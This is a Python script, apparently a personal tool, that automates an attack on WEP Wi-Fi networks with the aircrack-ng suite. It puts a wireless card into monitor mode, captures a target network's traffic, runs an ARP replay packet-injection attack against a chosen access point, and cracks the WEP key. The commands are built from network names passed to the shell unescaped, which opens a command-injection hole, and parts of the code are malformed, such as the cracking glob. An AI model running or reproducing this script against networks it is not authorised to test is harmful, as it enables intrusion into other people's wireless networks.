#!/usr/bin/python
import time
import os
import signal
import subprocess

def monitoring():
	cmd_only_airmon = subprocess.check_output(["airmon-ng"])
	fichier = open("airmon.txt", "w")
	fichier.write(cmd_only_airmon)
	fichier.close()
	
	fichier = open("airmon.txt", "r")
	file_line = fichier.readline()
	wlan_wanted = ""
	while file_line !="":
		file_line = fichier.readline()
		if "rt2800" in file_line:
			wlan_wanted = file_line[:5].replace(" ", "")
	
	print wlan_wanted
	print "derniere ligne"
	
	cmd_monitoring = subprocess.check_output(["airmon-ng", "start", wlan_wanted])

def global_listening():
	cmd = "airodump-ng -w qq mon0"
	FNULL = open(os.devnull, 'w')
	
	# The os.setsid() is passed in the argument preexec_fn so
	# it's run after the fork() and before  exec() to run the shell.
	pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
	
	print pro
	print pro.pid
	time.sleep(10)
	print os.killpg(pro.pid, signal.SIGTERM)  # Send the signal to all the process groups

def network_listening(registered_network):
	BSSID = registered_network._BSSID
	ESSID = registered_network._ESSID
	Channel = registered_network._Channel

	cmd = "airodump-ng -w TestBox/" + ESSID + "/record -d " + BSSID + " mon0 --channel " + str(Channel) +" --ignore-negative-one"

	FNULL = open(os.devnull, 'w')
	pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
	print pro
	print pro.pid
	time.sleep(10)
	print os.killpg(pro.pid, signal.SIGTERM)  # Send the signal to all the process groups

def arp_attack(registered_network, datafile_path):
	BSSID = registered_network._BSSID
	ESSID = registered_network._ESSID
	Channel = registered_network._Channel

	cmd = "aireplay-ng -3 -e " + ESSID + " -h " + BSSID + " -r " + datafile_path + " mon0 --ignore-negative-one";

	FNULL = open(os.devnull, 'w')
	pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
	print pro
	print pro.pid
	time.sleep(10)
	print os.killpg(pro.pid, signal.SIGTERM)  # Send the signal to all the process groups

def aircrack_final_wep(datafile_path):
	cmd = "aircrack-ng " + datafile_path + "/*<.cap/.iv>"; 

	FNULL = open(os.devnull, 'w')
	pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
	print pro
	print pro.pid
	time.sleep(10)
	print os.killpg(pro.pid, signal.SIGKILL)  # Send the signal to all the process groups

